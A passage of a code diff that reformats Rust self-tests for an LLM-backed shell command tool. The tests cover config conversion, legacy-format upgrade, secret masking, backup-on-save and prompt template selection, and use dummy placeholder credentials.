+            && entries[0].auth_token == "k1"
+            && entries[0].model == "gemma-4-31b"
+            && entries[0].retries == 2,
+    );
+    check(
+        "setup json_to_entries: api_style kept",
+        entries[1].api_style.as_deref() == Some("openai"),
+    );
+    check(
+        "setup json_to_entries: retries defaults to 1",
+        entries[1].retries == 1,
+    );
 
     let search = crate::setup::SetupSearch::from_json(&cfg_json);
-    check("setup search: default off", search.provider == "off" && search.to_json().is_none());
+    check(
+        "setup search: default off",
+        search.provider == "off" && search.to_json().is_none(),
+    );
     let rebuilt = crate::setup::entries_to_json(&entries, &search, &cfg_json);
-    check("setup entries_to_json: preserves other keys",
-        rebuilt["prefer"]["grep"][0] == "rg" && rebuilt["custom_key"] == "keepme");
-    check("setup entries_to_json: providers rebuilt",
+    check(
+        "setup entries_to_json: preserves other keys",
+        rebuilt["prefer"]["grep"][0] == "rg" && rebuilt["custom_key"] == "keepme",
+    );
+    check(
+        "setup entries_to_json: providers rebuilt",
         rebuilt["providers"]["cerebras"]["auth_token"] == "k1"
-        && rebuilt["providers"]["local"]["api_style"] == "openai");
-    check("setup entries_to_json: model order kept",
-        rebuilt["models"][0]["provider"] == "cerebras" && rebuilt["models"][1]["model"] == "qwen3");
-    check("setup entries_to_json: retries 1 omitted",
-        rebuilt["models"][1].get("retries").is_none() && rebuilt["models"][0]["retries"] == 2);
-    check("setup entries_to_json: search dropped when off", rebuilt.get("search").is_none());
-    check("setup round-trip: entries equal", crate::setup::json_to_entries(&rebuilt) == entries);
+            && rebuilt["providers"]["local"]["api_style"] == "openai",
+    );
+    check(
+        "setup entries_to_json: model order kept",
+        rebuilt["models"][0]["provider"] == "cerebras" && rebuilt["models"][1]["model"] == "qwen3",
+    );
+    check(
+        "setup entries_to_json: retries 1 omitted",
+        rebuilt["models"][1].get("retries").is_none() && rebuilt["models"][0]["retries"] == 2,
+    );
+    check(
+        "setup entries_to_json: search dropped when off",
+        rebuilt.get("search").is_none(),
+    );
+    check(
+        "setup round-trip: entries equal",
+        crate::setup::json_to_entries(&rebuilt) == entries,
+    );
 
     // mask_secret: head + last two chars, short secrets fully hidden
-    check("setup mask_secret: head…tail",
-        crate::setup::mask_secret("sk-abcdef123456") == "sk-a…56");
-    check("setup mask_secret: short hidden",
-        crate::setup::mask_secret("sk") == "…" && crate::setup::mask_secret("").is_empty());
+    check(
+        "setup mask_secret: head…tail",
+        crate::setup::mask_secret("sk-abcdef123456") == "sk-a…56",
+    );
+    check(
+        "setup mask_secret: short hidden",
+        crate::setup::mask_secret("sk") == "…" && crate::setup::mask_secret("").is_empty(),
+    );
 
     // Legacy single-model format upgrades to providers+models on save
     let legacy_json = serde_json::json!({
         "base_url": "https://api.anthropic.com", "auth_token": "sk", "model": "claude-x", "lang": "zh"
     });
     let legacy_entries = crate::setup::json_to_entries(&legacy_json);
-    check("setup legacy: one default entry",
-        legacy_entries.len() == 1 && legacy_entries[0].provider == "default"
-        && legacy_entries[0].auth_token == "sk" && legacy_entries[0].model == "claude-x");
+    check(
+        "setup legacy: one default entry",
+        legacy_entries.len() == 1
+            && legacy_entries[0].provider == "default"
+            && legacy_entries[0].auth_token == "sk"
+            && legacy_entries[0].model == "claude-x",
+    );
     let upgraded = crate::setup::entries_to_json(&legacy_entries, &search, &legacy_json);
-    check("setup legacy: upgraded format",
-        upgraded["models"][0]["provider"] == "default" && upgraded["providers"]["default"]["base_url"] == "https://api.anthropic.com");
-    check("setup legacy: old keys removed, lang kept",
-        upgraded.get("base_url").is_none() && upgraded.get("auth_token").is_none()
-        && upgraded.get("model").is_none() && upgraded["lang"] == "zh");
+    check(
+        "setup legacy: upgraded format",
+        upgraded["models"][0]["provider"] == "default"
+            && upgraded["providers"]["default"]["base_url"] == "https://api.anthropic.com",
+    );
+    check(
+        "setup legacy: old keys removed, lang kept",
+        upgraded.get("base_url").is_none()
+            && upgraded.get("auth_token").is_none()
+            && upgraded.get("model").is_none()
+            && upgraded["lang"] == "zh",
+    );
 
     let search_on = crate::setup::SetupSearch {
-        provider: "tavily".into(), api_key: Some("tv".into()), base_url: None, max_results: Some(7),
+        provider: "tavily".into(),
+        api_key: Some("tv".into()),
+        base_url: None,
+        max_results: Some(7),
     };
     let with_search = crate::setup::entries_to_json(&entries, &search_on, &cfg_json);
-    check("setup search: written",
-        with_search["search"]["provider"] == "tavily" && with_search["search"]["api_key"] == "tv"
-        && with_search["search"]["max_results"] == 7);
+    check(
+        "setup search: written",
+        with_search["search"]["provider"] == "tavily"
+            && with_search["search"]["api_key"] == "tv"
+            && with_search["search"]["max_results"] == 7,
+    );
 
     let mut v = vec![1, 2, 3];
-    check("move_item: down", crate::setup::move_item(&mut v, 0, false) && v == [2, 1, 3]);
-    check("move_item: up", crate::setup::move_item(&mut v, 1, true) && v == [1, 2, 3]);
-    check("move_item: up at top is no-op", !crate::setup::move_item(&mut v, 0, true) && v == [1, 2, 3]);
-    check("move_item: down at bottom is no-op", !crate::setup::move_item(&mut v, 2, false) && v == [1, 2, 3]);
+    check(
+        "move_item: down",
+        crate::setup::move_item(&mut v, 0, false) && v == [2, 1, 3],
+    );
+    check(
+        "move_item: up",
+        crate::setup::move_item(&mut v, 1, true) && v == [1, 2, 3],
+    );
+    check(
+        "move_item: up at top is no-op",
+        !crate::setup::move_item(&mut v, 0, true) && v == [1, 2, 3],
+    );
+    check(
+        "move_item: down at bottom is no-op",
+        !crate::setup::move_item(&mut v, 2, false) && v == [1, 2, 3],
+    );
 
     // Timestamped backup + atomic save
-    check("utc_timestamp: epoch", crate::setup::utc_timestamp(0) == "19700101-000000");
-    check("utc_timestamp: known date", crate::setup::utc_timestamp(1754604000) == "20250807-220000");
-    let tmp_cfg = std::env::temp_dir().join(format!("comma-test-setup-{}.json", std::process::id()));
+    check(
+        "utc_timestamp: epoch",
+        crate::setup::utc_timestamp(0) == "19700101-000000",
+    );
+    check(
+        "utc_timestamp: known date",
+        crate::setup::utc_timestamp(1754604000) == "20250807-220000",
+    );
+    let tmp_cfg =
+        std::env::temp_dir().join(format!("comma-test-setup-{}.json", std::process::id()));
     std::fs::write(&tmp_cfg, r#"{"old": true}"#).unwrap();
     let new_json = serde_json::json!({"new": true});
     let backup = crate::setup::save_config(&tmp_cfg, &new_json).unwrap();
     check("setup save: backup created", backup.is_some());
     let backup = backup.unwrap();
-    check("setup save: backup has original content",
-        std::fs::read_to_string(&backup).unwrap() == r#"{"old": true}"#);
-    check("setup save: new content written",
-        std::fs::read_to_string(&tmp_cfg).unwrap().contains("\"new\": true"));
-    check("setup save: backup name pattern",
-        backup.file_name().unwrap().to_str().unwrap().starts_with("comma-test-setup-")
-        && backup.extension().and_then(|e| e.to_str()) == Some("bak"));
+    check(
+        "setup save: backup has original content",
+        std::fs::read_to_string(&backup).unwrap() == r#"{"old": true}"#,
+    );
+    check(
+        "setup save: new content written",
+        std::fs::read_to_string(&tmp_cfg)
+            .unwrap()
+            .contains("\"new\": true"),
+    );
+    check(
+        "setup save: backup name pattern",
+        backup
+            .file_name()
+            .unwrap()
+            .to_str()
+            .unwrap()
+            .starts_with("comma-test-setup-")
+            && backup.extension().and_then(|e| e.to_str()) == Some("bak"),
+    );
     let _ = std::fs::remove_file(&tmp_cfg);
     let _ = std::fs::remove_file(&backup);
-    let tmp_missing = std::env::temp_dir().join(format!("comma-test-setup-missing-{}.json", std::process::id()));
+    let tmp_missing = std::env::temp_dir().join(format!(
+        "comma-test-setup-missing-{}.json",
+        std::process::id()
+    ));
     let _ = std::fs::remove_file(&tmp_missing);
-    check("setup save: no backup for missing file",
-        crate::setup::save_config(&tmp_missing, &new_json).unwrap().is_none()
-        && tmp_missing.is_file());
+    check(
+        "setup save: no backup for missing file",
+        crate::setup::save_config(&tmp_missing, &new_json)
+            .unwrap()
+            .is_none()
+            && tmp_missing.is_file(),
+    );
     let _ = std::fs::remove_file(&tmp_missing);
 
     // ── prompt.rs: template picking ─────────────────────────────────────────
     let default = crate::prompt::pick_template(None, None, None);
-    check("prompt: bare default", default == crate::prompt::DEFAULT_PROMPT);
+    check(
+        "prompt: bare default",
+        default == crate::prompt::DEFAULT_PROMPT,
+    );
     let with_add = crate::prompt::pick_template(None, None, Some("Always use sudo."));
-    check("prompt: additional appended",
-        with_add.starts_with(crate::prompt::DEFAULT_PROMPT) && with_add.ends_with("Always use sudo."));
-    check("prompt: empty additional ignored", crate::prompt::pick_template(None, None, Some("  ")) == crate::prompt::DEFAULT_PROMPT);
+    check(
+        "prompt: additional appended",
+        with_add.starts_with(crate::prompt::DEFAULT_PROMPT)
+            && with_add.ends_with("Always use sudo."),
+    );
+    check(
+        "prompt: empty additional ignored",
+        crate::prompt::pick_template(None, None, Some("  ")) == crate::prompt::DEFAULT_PROMPT,
+    );
     let same_legacy = format!("{}\n", crate::prompt::DEFAULT_PROMPT);
-    check("prompt: identical legacy ignored",
-        crate::prompt::pick_template(None, Some(&same_legacy), Some("EXTRA")) .ends_with("EXTRA"));
-    check("prompt: customized legacy honored",
-        crate::prompt::pick_template(None, Some("MY OWN PROMPT"), Some("EXTRA")) == "MY OWN PROMPT");
-    check("prompt: full_prompt wins over all",
-        crate::prompt::pick_template(Some("FULL OVERRIDE"), Some("MY OWN PROMPT"), Some("EXTRA")) == "FULL OVERRIDE");
-    check("prompt: blank full_prompt ignored",
-        crate::prompt::pick_template(Some("  "), None, None) == crate::prompt::DEFAULT_PROMPT);
-    check("prompt: warns against shell-specific env vars",
+    check(
+        "prompt: identical legacy ignored",
+        crate::prompt::pick_template(None, Some(&same_legacy), Some("EXTRA")).ends_with("EXTRA"),
+    );
+    check(
+        "prompt: customized legacy honored",
+        crate::prompt::pick_template(None, Some("MY OWN PROMPT"), Some("EXTRA")) == "MY OWN PROMPT",
+    );
+    check(
+        "prompt: full_prompt wins over all",
+        crate::prompt::pick_template(Some("FULL OVERRIDE"), Some("MY OWN PROMPT"), Some("EXTRA"))
+            == "FULL OVERRIDE",
+    );
+    check(
+        "prompt: blank full_prompt ignored",
+        crate::prompt::pick_template(Some("  "), None, None) == crate::prompt::DEFAULT_PROMPT,
+    );
+    check(
+        "prompt: warns against shell-specific env vars",
         crate::prompt::DEFAULT_PROMPT.contains("$ZSH_CUSTOM")
-        && crate::prompt::DEFAULT_PROMPT.contains("unexported variables"));
-    check("prompt: PowerShell syntax guidance",
+            && crate::prompt::DEFAULT_PROMPT.contains("unexported variables"),
+    );
+    check(
+        "prompt: PowerShell syntax guidance",
         crate::prompt::DEFAULT_PROMPT.contains("PowerShell")
-        && crate::prompt::DEFAULT_PROMPT.contains("NOT `&&`")
-        && crate::prompt::DEFAULT_PROMPT.contains("$env:VAR"));
+            && crate::prompt::DEFAULT_PROMPT.contains("NOT `&&`")
+            && crate::prompt::DEFAULT_PROMPT.contains("$env:VAR"),
+    );
 
     // Summary
     println!("\n{} passed, {} failed", pass, fail);
